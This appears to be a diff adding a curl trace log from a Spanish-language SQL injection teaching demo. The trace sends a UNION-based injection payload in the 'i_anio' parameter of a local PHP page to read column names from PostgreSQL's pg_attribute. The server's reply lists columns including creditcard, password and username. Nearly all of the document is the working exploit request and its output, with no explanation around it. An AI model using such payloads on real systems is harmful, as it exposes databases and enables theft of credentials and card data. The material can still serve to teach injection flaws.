@@ -1,0 +1,45 @@
+$ curl "http://localhost/xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%20all%20select%20attname%20as%20movietitle%20from%20pg_attribute%20where%20attrelid%20%3D%2021275%3B%20--" --trace-ascii f.txt
+
+
+== Info:   Trying ::1...
+== Info: TCP_NODELAY set
+== Info: Connected to localhost (::1) port 80 (#0)
+=> Send header, 236 bytes (0xec)
+0000: GET /xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%2
+0040: 0all%20select%20attname%20as%20movietitle%20from%20pg_attribute%
+0080: 20where%20attrelid%20%3D%2021275%3B%20-- HTTP/1.1
+00b3: Host: localhost
+00c4: User-Agent: curl/7.57.0
+00dd: Accept: */*
+00ea: 
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 17 bytes (0x11)
+0000: Host: localhost
+<= Recv header, 39 bytes (0x27)
+0000: Date: Tue, 19 Dec 2017 11:46:01 +0000
+<= Recv header, 19 bytes (0x13)
+0000: Connection: close
+<= Recv header, 25 bytes (0x19)
+0000: X-Powered-By: PHP/7.2.0
+<= Recv header, 40 bytes (0x28)
+0000: Content-type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 946 bytes (0x3b2)
+0000: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
+0040: .<html>.  <head>.    <meta http-equiv="Content-Type" content="te
+0080: xt/html; charset=UTF-8">.    <title>Ejemplo de SQL injection</ti
+00c0: tle>.  </head>.  <body>.    <h2> Ejemplo de SQL injection: Infor
+0100: maci..n en la BD</h2>.      <form name="consultaanio" method="ge
+0140: t" action="xSearchInjection.php">.        Pel..culas del a..o: <
+0180: input name="i_anio"/><br/>.        <input type="submit" value="M
+01c0: ostrar"/>.      </form>.    <ol>.<li>address1</li>.<li>address2<
+0200: /li>.<li>age</li>.<li>city</li>.<li>cmax</li>.<li>cmin</li>.<li>
+0240: country</li>.<li>creditcard</li>.<li>creditcardexpiration</li>.<
+0280: li>creditcardtype</li>.<li>ctid</li>.<li>customerid</li>.<li>ema
+02c0: il</li>.<li>firstname</li>.<li>gender</li>.<li>income</li>.<li>l
+0300: astname</li>.<li>password</li>.<li>phone</li>.<li>region</li>.<l
+0340: i>state</li>.<li>tableoid</li>.<li>username</li>.<li>xmax</li>.<
+0380: li>xmin</li>.<li>zip</li>.</ol>.  </body>.</html>.
+== Info: Closing connection 0
